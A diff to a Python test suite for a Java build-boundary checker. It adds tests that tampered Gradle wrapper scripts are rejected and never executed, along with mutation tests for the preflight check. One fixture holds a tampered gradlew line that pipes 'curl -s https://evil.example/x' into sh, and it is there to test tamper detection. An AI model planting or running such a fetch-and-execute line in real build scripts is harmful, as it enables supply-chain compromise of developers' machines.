@@ -315,6 +315,8 @@ BUILD_FIXTURES = {
                                  "      <component group=\"com.squareup.okhttp3\" name=\"okhttp\" version=\"4.12.0\">\n"
                                  "         <artifact name=\"okhttp-4.12.0.jar\"><sha256 value=\"00\"/></artifact>\n"
                                  "      </component>\n   </components>", "metadata_extra_component"),
+    "gradlew_tampered": ("gradlew", "#!/bin/sh", "#!/bin/sh\ncurl -s https://evil.example/x | sh", "gradlew_script_mismatch"),
+    "gradlew_bat_tampered": ("gradlew.bat", "@rem", "@rem tampered\r\n@rem", "gradlew_script_mismatch"),
 }
 
 
@@ -362,21 +364,43 @@ def _fake_jdk(root: Path, version: str = "21.0.13", javac: bool = True) -> Path:
     return root
 
 
-def _fake_gradle_home(root: Path, with_dist: bool = True) -> Path:
+def _fake_gradle_home(root: Path, with_dist: bool = True, folder: str | None = None, ok_marker: bool = True) -> Path:
     if with_dist:
-        (root / "wrapper/dists/gradle-9.9.1-bin/abc123/gradle-9.9.1/bin").mkdir(parents=True)
+        dist = root / "wrapper/dists/gradle-9.9.1-bin" / (folder or jb.wrapper_distribution_hash())
+        (dist / "gradle-9.9.1/bin").mkdir(parents=True)
+        if ok_marker:
+            (dist / "gradle-9.9.1-bin.zip.ok").write_text("", encoding="utf-8")
     else:
         root.mkdir(parents=True)
     return root
 
 
+def _good_env(tmp_path: Path) -> dict[str, str]:
+    return {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")), "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh"))}
+
+
+def test_wrapper_distribution_hash_matches_gradle_folder_rule():
+    # 개발 PC의 실제 캐시 폴더 이름(gradle-9.9.1-bin/dol8b552jwt4yhd7ihm3iahwb)과 같은 규칙: URL의 MD5를 36진수로
+    assert jb.wrapper_distribution_hash() == "dol8b552jwt4yhd7ihm3iahwb"
+
+
 def test_java_step_preflight_passes_with_jdk21_and_cached_distribution(tmp_path):
-    env = {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")), "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh"))}
-    assert java_build.preflight(env) == []
+    assert java_build.preflight(_good_env(tmp_path)) == []
 
 
-@pytest.mark.parametrize("case", ["no_java_home", "jdk17", "jre_without_javac", "no_gradle_home", "no_cached_distribution"])
+@pytest.mark.parametrize("case", ["no_java_home", "jdk17", "jre_without_javac", "no_gradle_home", "no_cached_distribution",
+                                  "cache_from_other_url", "cache_without_ok_marker"])
 def test_java_step_preflight_fails_instead_of_skipping_or_downloading(tmp_path, case):
+    if case == "cache_from_other_url":
+        env = {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")),
+               "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh", folder="abc123"))}
+        assert java_build.preflight(env), case
+        return
+    if case == "cache_without_ok_marker":
+        env = {"JAVA_HOME": str(_fake_jdk(tmp_path / "jdk")),
+               "GRADLE_USER_HOME": str(_fake_gradle_home(tmp_path / "gh", ok_marker=False))}
+        assert java_build.preflight(env), case
+        return
     if case == "no_java_home":
         jdk = None
     elif case == "jdk17":
@@ -396,6 +420,43 @@ def test_java_step_runs_gradle_offline():
     assert "verify-java" in (REPO_ROOT / "Makefile").read_text(encoding="utf-8")
 
 
+TAMPERED_SH = "#!/bin/sh\necho x > \"$(dirname \"$0\")/marker.txt\"\n"
+TAMPERED_BAT = "@echo off\r\necho x> \"%~dp0marker.txt\"\r\n"
+
+
+def test_tampered_wrapper_script_is_never_executed(tmp_path):
+    """(a) 실행되면 표식 파일을 쓰는 가짜 gradlew — 사전 점검이 실패하고 표식 파일이 생기지 않는다(실제 subprocess)."""
+    project = _copy(tmp_path)
+    (project / "gradlew").write_text(TAMPERED_SH, encoding="utf-8", newline="")
+    (project / "gradlew.bat").write_text(TAMPERED_BAT, encoding="utf-8", newline="")
+    assert java_build.run(_good_env(tmp_path), project) == 1
+    assert not (project / "marker.txt").exists()
+
+
+def test_changed_distribution_url_fails_before_any_execution(tmp_path, monkeypatch):
+    """(b) distributionUrl 변경 — gradlew를 부르기 전에 실패한다."""
+    project = _copy(tmp_path)
+    _edit(project, "gradle/wrapper/gradle-wrapper.properties", "services.gradle.org", "mirror.example")
+    calls = []
+    monkeypatch.setattr(java_build.subprocess, "run", lambda *a, **k: calls.append(a))
+    assert java_build.run(_good_env(tmp_path), project) == 1
+    assert calls == []
+
+
+def test_untouched_wrapper_runs_gradle_offline_as_control(tmp_path, monkeypatch):
+    """(c) 정상 — 사전 점검을 통과하고 gradlew를 --offline으로 한 번 부른다."""
+    project = _copy(tmp_path)
+    calls = []
+
+    def fake_run(cmd, **kwargs):
+        calls.append(cmd)
+        return subprocess.CompletedProcess(cmd, 0)
+
+    monkeypatch.setattr(java_build.subprocess, "run", fake_run)
+    assert java_build.run(_good_env(tmp_path), project) == 0
+    assert len(calls) == 1 and "--offline" in calls[0]
+
+
 # ─────────────────────────────── 변이 확인(변이본 로드 표지 확인 후 결과 해석)
 STAMP = "java_boundary_probe"
 _DRIVER = """
@@ -408,27 +469,33 @@ print(f"{STAMP} module={sys.modules[sys.argv[1]].__file__} keys=-", flush=True)
 sys.exit(int(code))
 """
 _T = "tests/test_java_boundary.py::"
+_JB, _BUILD = "tools.java_boundary", "tools.java_build"
 MUTATIONS = {
-    "no_target_send_allowlist_off": ("                    if call.group(1) not in MONTOYA_CALLS:\n",
+    "no_target_send_allowlist_off": (_JB, "                    if call.group(1) not in MONTOYA_CALLS:\n",
                                      "                    if False:\n",
                                      [_T + "test_target_send_fixture_is_rejected[call_outside_allowlist]"]),
-    "loopback_transport_rule_off": ("        if not in_transport:\n", "        if False:\n",
+    "loopback_transport_rule_off": (_JB, "        if not in_transport:\n", "        if False:\n",
                                     [_T + "test_loopback_fixture_is_rejected[client_outside_transport]"]),
-    "logic_entry_count_off": ("    if len(entries) != 1:\n", "    if False:\n",
+    "logic_entry_count_off": (_JB, "    if len(entries) != 1:\n", "    if False:\n",
                               [_T + "test_logic_isolation_fixture_is_rejected[two_entry_points]"]),
-    "build_coordinate_allowlist_off": ("        if (conf, g, a) not in ALLOWED_COORDS:\n", "        if False:\n",
+    "build_coordinate_allowlist_off": (_JB, "        if (conf, g, a) not in ALLOWED_COORDS:\n", "        if False:\n",
                                        [_T + "test_build_egress_fixture_is_rejected[coordinate_not_allowed]"]),
+    "preflight_wrapper_check_removed": (_BUILD, "    problems = [f\"wrapper 고정값 위반: {v.code}\" for v in "
+                                                "java_boundary.wrapper_violations(project)]\n",
+                                        "    problems = []\n",
+                                        [_T + "test_tampered_wrapper_script_is_never_executed"]),
 }
 
 
 @pytest.mark.parametrize("name", sorted(MUTATIONS))
 def test_java_boundary_check_is_load_bearing_under_verified_mutation(tmp_path, name):
-    old, new, nodes = MUTATIONS[name]
-    mutant = copy_with_mutation(REPO_ROOT, ["tools"], tmp_path / "mut", "tools/java_boundary.py", old, new)
+    module, old, new, nodes = MUTATIONS[name]
+    rel = module.replace(".", "/") + ".py"
+    mutant = copy_with_mutation(REPO_ROOT, ["tools"], tmp_path / "mut", rel, old, new)
     env = {**os.environ, "PYTHONUTF8": "1",
            "PYTHONPATH": os.pathsep.join([str(tmp_path / "mut"), str(REPO_ROOT / "src"), str(REPO_ROOT)])}
     env.pop("PYTEST_ADDOPTS", None)
-    r = subprocess.run([sys.executable, "-c", _DRIVER.replace("{STAMP}", STAMP), "tools.java_boundary", *nodes],
+    r = subprocess.run([sys.executable, "-c", _DRIVER.replace("{STAMP}", STAMP), module, *nodes],
                        cwd=REPO_ROOT, env=env, capture_output=True, text=True, encoding="utf-8", timeout=600)
     out = r.stdout + r.stderr
     assert_loaded_from(out, STAMP, mutant)
